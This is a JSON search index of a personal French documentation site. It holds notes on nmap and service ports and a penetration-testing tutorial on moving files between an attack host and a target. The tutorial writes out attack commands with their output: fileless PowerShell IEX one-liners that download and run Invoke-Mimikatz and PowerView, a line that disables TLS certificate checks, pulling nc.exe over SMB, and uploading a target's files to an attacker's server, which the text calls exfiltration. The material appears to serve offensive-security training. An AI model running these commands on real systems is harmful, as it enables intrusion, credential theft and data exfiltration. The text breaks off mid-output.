{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Bonjour, </p> <p>Vous d\u00e9couvrez ici mes documentations diverses </p>"},{"location":"CV/","title":"CV","text":"<p>CV lala Fr\u00e9d\u00e9ric</p>"},{"location":"Hack/nmap/","title":"NMAP","text":""},{"location":"Hack/nmap/#description","title":"D\u00e9scription","text":"<p>Nmap est un logiciel de cartographie de r\u00e9seaux qui s\u2019est impos\u00e9 comme l\u2019un des outils de d\u00e9couverte gratuits les plus populaires du march\u00e9. C\u2019est d\u00e9sormais l\u2019un des principaux outils de cartographie utilis\u00e9s par les administrateurs r\u00e9seau. Ce programme peut \u00eatre utilis\u00e9 pour trouver des h\u00f4tes actifs sur un r\u00e9seau, effectuer un balayage de ports, des balayages ping, ainsi que d\u00e9tecter le syst\u00e8me d\u2019exploitation d\u2019une machine et la version d\u2019un logiciel.</p>"},{"location":"Hack/nmap/#scan-de-reseau","title":"Scan de r\u00e9seau","text":"<pre><code>nmap [Type de Scans] [Options] {Host cible} \n\nnmap -sP 192.168.1.1/24         # d\u00e9couverte de tout les hosts sur le r\u00e9seau 'scan et ping )\nnmap 192.168.10,.0-255          # scan plage d'adresses  \n     192.168.10.*\n     192.168.10.0/24\nnmap -iL /host.txt              # scan de host dans un fichier \n\n# options\n    -v ou -vv                   # mode bavard\n    --exclude 192.168.1.5       # exclure un host \n    -sL 192.168.1.1/30          # liste simplement les ip du masque \n    -PN 192.168.1.1/24          # pas de scan ping \n\n    -PS 192.168.1.1/24          # ping tcp syn \n    -PA                         # ping tcp ack \n    -PU                         # ping udp \n    -PE; -PP; -PM               # ping icmp \n    -PR                         # ping arp \n\n    --exclude 192.168.1.1       # exclure ip \n    -n                          # pas de dns \n    -R                          # dns \n\n    \u2013open                       # Afficher que les ports ouverts\n    -oN                         # Enregistrer le r\u00e9sultat du scan dans un fichier au formate texte\n    -oX                         # Enregistrer le r\u00e9sultat du scan dans un fichier au formate XML\n    -p                          # Sp\u00e9cifier les ports r\u00e9seaux \u00e0 scanner\n    -Pn                         # D\u00e9sactiver la d\u00e9couverte d\u2019h\u00f4te\n    -r                          # Analyser les ports cons\u00e9cutivement\n    -sT                         # Faire un scan de port TCP\n    -sU                         # Faire un scan de port UDP\n    -sV                         # Trouver les versions du service\n    -script                     # Utilise un script interne \u00e0 nmap pour scan de vuln\u00e9rabilit\u00e9, bruteforce, etc\n\n</code></pre>"},{"location":"Hack/telnet/","title":"telnet","text":""},{"location":"Hack/telnet/#les-port-et-faille","title":"Les port et faille","text":""},{"location":"Hack/telnet/#ftp","title":"ftp","text":"<p>Port 21/tcp</p> <p>compte \"anonymous\" = pass aucune importance </p>"},{"location":"Hack/telnet/#telnet_1","title":"telnet","text":"<p>Port 23/tcp</p>"},{"location":"Hack/telnet/#smb","title":"smb","text":"<p>Port 1145/tcp </p> <pre><code>\nsmbclient -L &lt;hote ou ip &gt;              # Liste des partages SMB\n        -N                              # supprime la demande de mdp \n        -U &lt;user&gt;                       # fourni un user \n</code></pre> <p>Le client SMB dans un shell Interactive smbclient fournit aussi un shell interactif comme certains clients ftp (ncftp, lftp, \u2026). Dans ce dernier vous pouvez passer diff\u00e9rentes commandes pour effectuer les op\u00e9rations souhait\u00e9es.</p> <pre><code>smbclient -U sambauser \"\\\\10.0.0.43\\partagedemo\"\n</code></pre> <p>Si vous rencontrez l\u2019erreur suivante lors de la connexion SMB :</p> <pre><code>Not enough '\\' characters in service\n</code></pre> <p>Triplez l\u2019antislash pour la r\u00e9soudre, comme ceci :</p> <pre><code>smbclient -U sambauser -L \"\\\\\\10.0.0.43\\partagedemo\"\n</code></pre>"},{"location":"Hack/telnet/#envoyer-des-fichiers-et-des-dossiers","title":"Envoyer des fichiers et des dossiers","text":"<p>Les fichiers et les dossiers peuvent \u00eatre t\u00e9l\u00e9charg\u00e9s avec la commande mput. Mais afin de t\u00e9l\u00e9charger un dossier sp\u00e9cifique et son contenu, le mode r\u00e9cursif doit \u00eatre activ\u00e9 avec la commande recurse. Le t\u00e9l\u00e9chargement peut \u00e9galement \u00eatre lanc\u00e9 avec la commande mput.</p> <p>smb: &gt; recurse # Active le mode r\u00e9cursif</p> <p>smb: &gt; mput Images # Upload du dossier Images</p> <p>smb: &gt; recurse # D\u00e9sactive le mode r\u00e9cursif</p>"},{"location":"Hack/telnet/#telecharger-des-fichiers-et-des-dossiers","title":"T\u00e9l\u00e9charger des fichiers et des dossiers","text":"<p>Les fichiers et les dossiers peuvent \u00e9galement \u00eatre t\u00e9l\u00e9charg\u00e9s avec la commande mget. S\u2019il y a plusieurs fichiers et dossiers \u00e0 t\u00e9l\u00e9charger, le mode r\u00e9cursif doit \u00eatre activ\u00e9 avec la commande recurse.</p> <p>smb: &gt; recurse</p> <p>smb: &gt; mget Images</p> <p>smb: &gt; recurse</p>"},{"location":"Hack/telnet/#liste-des-attributs-des-fichiers-et-des-dossiers","title":"Liste des attributs des fichiers et des dossiers","text":"<p>smb: &gt; allinfo monfichier.txt</p>"},{"location":"Hack/telnet/#redis","title":"Redis","text":"<p>R\u00e9dis (de l'anglais REmote DIctionary Server qui peut \u00eatre traduit par \u00ab serveur de dictionnaire distant \u00bb et jeu de mots avec Redistribute ) est un magasin de donn\u00e9es cl\u00e9-valeur NoSQL avanc\u00e9 open source utilis\u00e9 comme base de donn\u00e9es,  cache et courtier de messages. Les donn\u00e9es sont stock\u00e9es dans un format de dictionnaire ayant des paires cl\u00e9-valeur. Il est g\u00e9n\u00e9ralement utilis\u00e9  pour le stockage \u00e0 court terme de donn\u00e9es n\u00e9cessitant une r\u00e9cup\u00e9ration rapide. Redis sauvegarde les donn\u00e9es sur les disques durs pour assurer  la coh\u00e9rence</p>"},{"location":"Hack/transfert%20de%20fichier/","title":"Le transfert de fichier","text":""},{"location":"Hack/transfert%20de%20fichier/#powershell-base64-decode-encode","title":"Powershell base64 d\u00e9code encode","text":"<p>Check de la cl\u00e9 ssh en hash md5</p> <pre><code>admin@pc[/pc]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n</code></pre> <p>Encodage de la cl\u00e9 en base64</p> <pre><code>&gt;admin@pc[/pc]$ cat id_rsa |base64 -w 0;echo\n&gt;\n&gt;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...\n</code></pre> <p>Nous pouvons copier ce contenu et le coller dans une borne Windows PowerShell et utiliser certaines fonctions PowerShell pour le d\u00e9coder.</p> <pre><code>&gt;PS C:\\pc&gt; [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...\n</code></pre> <p>Enfin, nous pouvons confirmer si le fichier a \u00e9t\u00e9 transf\u00e9r\u00e9 avec succ\u00e8s \u00e0 l'aide du Get-FileHash cmdlet, qui fait la m\u00eame chose que md5sum fait.</p> <pre><code>PS C:\\pc&gt; Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n\nAlgorithm       Hash                            Path\n---------       ----                            ----\nMD5      4E301756A07DED0A2DD6953ABF015278        C:\\Users\\Public\\id_rsa\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#telechargements-web-powershell","title":"T\u00e9l\u00e9chargements Web PowerShell","text":"<p>PowerShell propose de nombreuses options de transfert de fichiers.</p> <p>Dans n'importe quelle version de PowerShell, le System.Net.WebClient peut \u00eatre utilis\u00e9e pour t\u00e9l\u00e9charger un fichier sur HTTP, HTTPS ou FTP. Les \u00e9l\u00e9ments suivants d\u00e9crivent les m\u00e9thodes WebClient pour t\u00e9l\u00e9charger des donn\u00e9es \u00e0 partir d'une ressource:</p> Method Description OpenRead Renvoie les donn\u00e9es d'une ressource en tant que Flux. OpenReadAsync Renvoie les donn\u00e9es d'une ressource sans bloquer le thread appelant. DownloadData T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets. DownloadDataAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets sans bloquer le thread appelant. DownloadFile T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local. DownloadFileAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local sans bloquer le thread appelant. DownloadString T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource et renvoie une cha\u00eene. DownloadStringAsync T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource sans bloquer le fil appelant."},{"location":"Hack/transfert%20de%20fichier/#methode-powershell-downloadfile","title":"M\u00e9thode PowerShell DownloadFile","text":"<p>Nous pouvons sp\u00e9cifier le nom de la classe Net.WebClient et la m\u00e9thode DownloadFile avec les param\u00e8tres correspondant \u00e0 l'URL du fichier cible \u00e0 t\u00e9l\u00e9charger et le nom du fichier de sortie.</p> <pre><code>PS C:\\pc&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\pc&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\pc&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\pc&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#powershell-downloadstring-methode-sans-fichier","title":"PowerShell DownloadString - M\u00e9thode sans fichier","text":"<p>Comme nous l'avons vu pr\u00e9c\u00e9demment, les attaques sans fichier fonctionnent en utilisant certaines fonctions du syst\u00e8me d'exploitation pour t\u00e9l\u00e9charger la charge utile et l'ex\u00e9cuter directement. </p> <p>PowerShell peut \u00e9galement \u00eatre utilis\u00e9 pour effectuer des attaques sans fichier. </p> <p>Au lieu de t\u00e9l\u00e9charger un script PowerShell sur disque, nous pouvons l'ex\u00e9cuter directement en m\u00e9moire \u00e0 l'aide du Invoke-Expression cmdlet ou l'alias IEX.</p> <pre><code>PS C:\\pc&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n</code></pre> <p>IEX accepte \u00e9galement les entr\u00e9es de pipeline.</p> <pre><code>PS C:\\pc&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#powershell-invoke-webrequest","title":"PowerShell Invoke-WebRequest","text":"<p>\u00c0 partir de PowerShell 3.0, le Invoke-WebRequest cmdlet est \u00e9galement disponible, mais il est nettement plus lent \u00e0 t\u00e9l\u00e9charger des fichiers. </p> <p>Vous pouvez utiliser les alias iwr, curl, et wget au lieu de la Invoke-WebRequest nom complet.</p> <pre><code>PS C:\\pc&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n</code></pre> <p>https://gist.github.com/HarmJ0y/bb48307ffa663256e239</p>"},{"location":"Hack/transfert%20de%20fichier/#erreurs-courantes-avec-powershell","title":"Erreurs courantes avec PowerShell","text":"<p>Il peut y avoir des cas o\u00f9 la configuration du premier lancement d'Internet Explorer n'est pas termin\u00e9e, ce qui emp\u00eache le t\u00e9l\u00e9chargement.</p> <p></p> <p>Cela peut \u00eatre contourn\u00e9 \u00e0 l'aide du param\u00e8tre -UseBasicParsing.</p> <pre><code>PS C:\\pc&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\pc&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX\n</code></pre> <p>Une autre erreur dans les t\u00e9l\u00e9chargements PowerShell est li\u00e9e au canal s\u00e9curis\u00e9 SSL / TLS si le certificat n'est pas fiable. Nous pouvons contourner cette erreur avec la commande suivante:</p> <pre><code>PS C:\\pc&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nException calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust\nrelationship for the SSL/TLS secure channel.\"\nAt line:1 char:1\n+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\nPS C:\\pc&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#telechargements-smb","title":"T\u00e9l\u00e9chargements SMB","text":"<p>Le protocole SMB qui s'ex\u00e9cute sur le port TCP / 445 est courant dans les r\u00e9seaux d'entreprise o\u00f9 les services Windows s'ex\u00e9cutent. </p> <p>Il permet aux applications et aux utilisateurs de transf\u00e9rer des fichiers vers et depuis des serveurs distants.</p> <p>Nous pouvons utiliser SMB pour t\u00e9l\u00e9charger facilement des fichiers depuis notre Pwnbox. </p> <p>Nous devons cr\u00e9er un serveur SMB dans notre Pwnbox avec smbserver.py de Impacket puis utiliser copy, move, PowerShell Copy-Item, ou tout autre outil permettant la connexion \u00e0 SMB.</p>"},{"location":"Hack/transfert%20de%20fichier/#creer-le-serveur-smb","title":"Cr\u00e9er le serveur SMB","text":"<pre><code>admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#copiez-un-fichier-a-partir-du-serveur-smb","title":"Copiez un fichier \u00e0 partir du serveur SMB","text":"<pre><code>C:\\pc&gt; copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n</code></pre> <p>Les nouvelles versions de Windows bloquent l'acc\u00e8s non authentifi\u00e9 des invit\u00e9s, comme nous pouvons le voir dans la commande suivante:</p> <pre><code>C:\\pc&gt; copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#creez-le-serveur-smb-avec-un-nom-dutilisateur-et-un-mot-de-passe","title":"Cr\u00e9ez le serveur SMB avec un nom d'utilisateur et un mot de passe","text":"<pre><code>admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#monter-le-serveur-smb-avec-nom-dutilisateur-et-mot-de-passe","title":"Monter le serveur SMB avec nom d'utilisateur et mot de passe","text":"<pre><code>C:\\pc&gt; net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\pc&gt; copy n:\\nc.exe\n        1 file(s) copied.\n</code></pre> <p>Remarque: Vous pouvez \u00e9galement monter le serveur SMB si vous recevez une erreur lorsque vous utilisez <code>copy filename \\\\ IP \\ sharename</code>.</p>"},{"location":"Hack/transfert%20de%20fichier/#telechargements-ftp","title":"T\u00e9l\u00e9chargements FTP","text":"<p>Une autre fa\u00e7on de transf\u00e9rer des fichiers consiste \u00e0 utiliser FTP ( File Transfer Protocol ), qui utilise le port TCP / 21 et TCP / 20.</p> <p>Nous pouvons utiliser le client FTP ou PowerShell Net.WebClient pour t\u00e9l\u00e9charger des fichiers \u00e0 partir d'un serveur FTP.</p> <p>Nous pouvons configurer un serveur FTP dans notre h\u00f4te d'attaque \u00e0 l'aide de Python3 pyftpdlib module. </p> <p>Il peut \u00eatre install\u00e9 avec la commande suivante:</p> <pre><code>admin@pc[/pc]$ sudo pip3 install pyftpdlib\n</code></pre> <p>Ensuite, nous pouvons sp\u00e9cifier le port num\u00e9ro 21 car, par d\u00e9faut, pyftpdlib utilise le port 2121. </p> <p>L'authentification anonyme est activ\u00e9e par d\u00e9faut si nous ne d\u00e9finissons pas d'utilisateur et de mot de passe.</p>"},{"location":"Hack/transfert%20de%20fichier/#configuration-dun-serveur-ftp-python3","title":"Configuration d'un serveur FTP Python3","text":"<pre><code>admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=3210 &lt;&lt;&lt;\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#transferer-des-fichiers-a-partir-dun-serveur-ftp-a-laide-de-powershell","title":"Transf\u00e9rer des fichiers \u00e0 partir d'un serveur FTP \u00e0 l'aide de PowerShell","text":"<pre><code>PS C:\\pc&gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')\n</code></pre> <p>Lorsque nous obtenons un shell sur une machine distante, nous n'avons peut-\u00eatre pas de shell interactif.</p> <p>Si tel est le cas, nous pouvons cr\u00e9er un fichier de commande FTP pour t\u00e9l\u00e9charger un fichier. </p> <p>Tout d'abord, nous devons cr\u00e9er un fichier contenant les commandes que nous voulons ex\u00e9cuter, puis utiliser le client FTP pour utiliser ce fichier pour t\u00e9l\u00e9charger ce fichier.</p>"},{"location":"Hack/transfert%20de%20fichier/#creer-un-fichier-de-commande-pour-le-client-ftp-et-telecharger-le-fichier-cible","title":"Cr\u00e9er un fichier de commande pour le client FTP et t\u00e9l\u00e9charger le fichier cible","text":"<pre><code>C:\\pc&gt; echo open 192.168.49.128 &gt; ftpcommand.txt\nC:\\pc&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\pc&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\pc&gt; echo GET file.txt &gt;&gt; ftpcommand.txt\nC:\\pc&gt; echo bye &gt;&gt; ftpcommand.txt\nC:\\pc&gt; ftp -v -n -s:ftpcommand.txt\nftp&gt; open 192.168.49.128\nLog in with USER and PASS first.\nftp&gt; USER anonymous\n\nftp&gt; GET file.txt\nftp&gt; bye\n\nC:\\pc&gt;more file.txt\nThis is a test file\n</code></pre> <p>Il existe \u00e9galement des situations telles que la fissuration par mot de passe, l'analyse, l'exfiltration, etc., o\u00f9 nous devons t\u00e9l\u00e9charger des fichiers de notre machine cible dans notre h\u00f4te d'attaque. </p> <p>Nous pouvons utiliser les m\u00eames m\u00e9thodes que nous avons utilis\u00e9es pr\u00e9c\u00e9dement.</p> <p>Voyons comment nous pouvons effectuer le t\u00e9l\u00e9chargement de fichiers de diff\u00e9rentes mani\u00e8res.</p>"},{"location":"Hack/transfert%20de%20fichier/#powershell-base64-encode-decode","title":"PowerShell Base64 Encode &amp; Decode","text":""},{"location":"Hack/transfert%20de%20fichier/#encoder-le-fichier-a-laide-de-powershell","title":"Encoder le fichier \u00e0 l'aide de PowerShell","text":"<p>````powershell  PS C:\\pc&gt; [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))</p> <p>IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= PS C:\\pc&gt; Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash</p> <p>Hash 3688374325B992DEF12793500307566D</p> <pre><code>\nNous copions ce contenu et le collons dans notre h\u00f4te d'attaque, utilisons la commande base64 pour le d\u00e9coder et utiliser le md5sum application pour confirmer le transfert s'est d\u00e9roul\u00e9 correctement.\n\n### Decode Base64 String sous Linux\n\n````sh\nadmin@pc[/pc]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d &gt; hosts\n</code></pre> <pre><code>admin@pc[/pc]$ md5sum hosts \n\n3688374325b992def12793500307566d  hosts\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#telechargements-web-powershell_1","title":"T\u00e9l\u00e9chargements Web PowerShell","text":"<p>PowerShell n'a pas de fonction int\u00e9gr\u00e9e pour les op\u00e9rations de t\u00e9l\u00e9chargement, mais nous pouvons utiliser Invoke-WebRequest ou Invoke-RestMethod pour construire notre fonction de t\u00e9l\u00e9chargement. Nous aurons \u00e9galement besoin d'un serveur Web qui accepte les t\u00e9l\u00e9chargements, ce qui n'est pas une option par d\u00e9faut dans la plupart des utilitaires de serveur Web courants.</p> <p>Pour notre serveur Web, nous pouvons utiliser serveur de telechargement, un module \u00e9tendu du Python http.Server, qui comprend une page de t\u00e9l\u00e9chargement de fichiers. Installons-le et d\u00e9marrons le serveur Web.</p>"},{"location":"Hack/transfert%20de%20fichier/#installation-dun-serveur-web-configure-avec-telechargement","title":"Installation d'un serveur Web configur\u00e9 avec t\u00e9l\u00e9chargement","text":"<pre><code>admin@pc[/pc]$ pip3 install uploadserver\n\nCollecting upload server\n  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)\nInstalling collected packages: uploadserver\nSuccessfully installed uploadserver-2.0.1\n</code></pre> <pre><code>admin@pc[/pc]$ python3 -m uploadserver\n\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre> <p>Nous pouvons maintenant utiliser un script PowerShell PSUpload.ps1 qui utilise Invoke-WebRequest pour effectuer les op\u00e9rations de t\u00e9l\u00e9chargement. </p> <p>Le script accepte deux param\u00e8tres -File, que nous utilisons pour sp\u00e9cifier le chemin de fichier, et -Uri, l'URL du serveur o\u00f9 nous t\u00e9l\u00e9chargerons notre fichier.</p> <p>Essayons de t\u00e9l\u00e9charger le fichier h\u00f4te \u00e0 partir de notre h\u00f4te Windows.</p> <pre><code>PS C:\\pc&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\pc&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#telechargement-web-powershell-base64","title":"T\u00e9l\u00e9chargement Web PowerShell Base64","text":"<p>Une autre fa\u00e7on d'utiliser les fichiers cod\u00e9s PowerShell et base64 pour les op\u00e9rations de t\u00e9l\u00e9chargement consiste \u00e0 utiliser Invoke-WebRequest ou Invoke-RestMethod avec Netcat. </p> <p>Nous utilisons Netcat pour \u00e9couter sur un port que nous sp\u00e9cifions et envoyer le fichier en tant que demande POST. </p> <p>Enfin, nous copions la sortie et utilisons la fonction de d\u00e9codage base64 pour convertir la cha\u00eene base64 en fichier.</p> <pre><code>PS C:\\pc&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\pc&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n</code></pre> <p>Nous capturons les donn\u00e9es base64 avec Netcat et utilisons l'application base64 avec l'option de d\u00e9codage pour convertir la cha\u00eene en fichier.</p> <pre><code>admin@pc[/pc]$ nc -lvnp 8000\n\nlistening on [any] 8000 ...\nconnect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923\nPOST / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682\nContent-Type: application/x-www-form-urlencoded\nHost: 192.168.49.128:8000\nContent-Length: 1820\nConnection: 